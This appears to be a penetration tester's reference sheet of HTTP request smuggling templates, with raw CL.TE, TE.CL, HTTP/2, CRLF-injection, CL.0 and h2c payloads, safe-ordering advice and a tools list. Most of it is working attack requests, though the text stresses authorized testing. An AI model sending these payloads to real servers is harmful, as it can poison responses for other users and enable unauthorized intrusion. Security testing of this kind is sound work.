# Request Smuggling Templates

All requests use `\r\n` line endings. In Burp Repeater, turn off "Update Content-Length" and show non-printable characters. Use HTTP/1.1 unless noted. Replace `TARGET` and `/path`.

## 1. CL.TE timing probe (bounded, send first)

```http
POST /path HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

Front end (CL) forwards `1\r\nA\r\n`; a TE back end waits for the next chunk size → delay. Nothing is left on the connection.

## 2. TE.CL timing probe (bounded, only if template 1 is negative)

```http
POST /path HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Front end (TE) forwards `0\r\n\r\n`; a CL back end waits for the sixth byte → delay. If the front end is actually CL.TE, the `X` would be left over and poison the next request, which is why template 1 goes first.

## 3. CL.TE differential confirmation (authorized-only on production)

Send this, then immediately a normal `GET /path` on a new tab/connection that only you use. Use a unique random path so no real user can receive the 404.

```http
POST /path HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /RANDOM-UNIQUE-404 HTTP/1.1
X-Ignore: X
```

Your follow-up request returning 404 for `/RANDOM-UNIQUE-404` confirms the desync. Note: if other traffic shares the back-end connection, someone else could receive that 404; this is why it is authorized-only.

## 4. TE.CL differential confirmation (authorized-only on production)

```http
POST /path HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /RANDOM-UNIQUE-404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The chunk size (`5e`) is the hex length of the smuggled request up to and including `x=1`; recompute it for your path.

## 5. H2.CL (HTTP/2, Burp Repeater in HTTP/2 mode)

```
:method POST
:path /path
:authority TARGET
content-type application/x-www-form-urlencoded
content-length 0

GET /RANDOM-UNIQUE-404 HTTP/1.1
Host: TARGET
Content-Length: 5

x=1
```

## 6. H2.TE

```
:method POST
:path /path
:authority TARGET
content-type application/x-www-form-urlencoded
transfer-encoding chunked

0

GET /RANDOM-UNIQUE-404 HTTP/1.1
Host: TARGET
X-Ignore: x
```

## 7. H2 CRLF injection (header value)

In Burp's Inspector, add a header with name `foo` and value `bar\r\nTransfer-Encoding: chunked` (use Shift+Enter for the CRLF), then use template 6's body.

## 8. CL.0 probe

```http
POST /static/anything.css HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: keep-alive

GET /RANDOM-UNIQUE-404 HTTP/1.1
X: Y
```

Send in a Burp tab group "Send group in sequence (single connection)" followed by a normal `GET /`. A 404 for your unique path on the second response means the back end ignored the body length.

## 9. h2c upgrade check

```bash
python3 h2csmuggler.py -x https://TARGET/ --test
```

Only report that upgrade is passed through; do not request internal paths without approval.

## Tools

| Tool | Use |
|---|---|
| Burp Suite + HTTP Request Smuggler extension | "Smuggle probe" (CL.TE/TE.CL/H2/CL.0/connection-state), safe detection |
| `smuggler.py` (defparam, installed by setup.sh) | `smuggler -u https://TARGET/path -m POST -t 10` — timing detection only; review the config list it sends |
| h2csmuggler (Bishop Fox) | h2c upgrade smuggling test |
| `scripts/smuggle_timing.py` | Minimal raw-socket CL.TE / TE.CL / TE.TE timing probe in safe order |
| PortSwigger labs | https://portswigger.net/web-security/request-smuggling |
